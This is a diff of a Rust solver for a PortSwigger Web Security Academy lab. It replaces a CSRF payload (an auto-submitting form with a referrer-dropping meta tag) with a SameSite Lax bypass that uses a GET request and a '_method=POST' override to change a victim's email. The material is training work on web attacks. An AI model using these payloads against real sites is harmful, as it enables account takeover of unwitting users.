@@ -1,17 +1,17 @@
-/***********************************************************************************
+/***************************************************************************************
 *
 * Author: Ahmed Elqalawy (@elqal3awii)
 *
-* Date: 21/10/2023
+* Date: 24/10/2023
 *
-* Lab: CSRF where Referer validation depends on header being present
+* Lab: SameSite Lax bypass via method override
 *
-* Steps: 1. Craft an HTML form for changing the email address with an auto-submit 
-*           script and a meta tag that drops the Referer header from the request
+* Steps: 1. Make the request to change the email using the GET method and include an 
+*           additional URL parameter to override the method
 *        2. Deliver the exploit to the victim
 *        3. The victim's email will be changed after they trigger the exploit
 *
-************************************************************************************/
+****************************************************************************************/
 #![allow(unused)]
 /***********
 * Imports
@@ -33,10 +33,10 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let lab_url = "https://0a420032045be765819b3e3100d70076.web-security-academy.net";
+    let lab_url = "https://0afd008e034f453a86acbc99007100e3.web-security-academy.net";
 
     // change this to your exploit server URL
-    let exploit_server_url = "https://exploit-0a1c00450483e76181b33d1c01bd00c8.exploit-server.net";
+    let exploit_server_url = "https://exploit-0a5b00cf032445ea8650bb6501e500e7.exploit-server.net";
 
     // build the client that will be used for all subsequent requests
     let client = build_client();
@@ -50,18 +50,9 @@ fn main() {
 
     // payload to change the victim's email
     let payload = format!(
-        r###"<html>
-                <body>
-                <meta name="referrer" content="never">
-                <form action="{lab_url}/my-account/change-email" method="POST">
-                    <input type="hidden" name="email" value="{new_email}" />
-                    <input type="submit" value="Submit request" />
-                </form>
-                <script>
-                    document.forms[0].submit();
-                </script>
-                </body>
-            </html>   
+        r###"<script>
+                location = "{lab_url}/my-account/change-email?email={new_email}&_method=POST"
+            </script>
       "###
     );
 
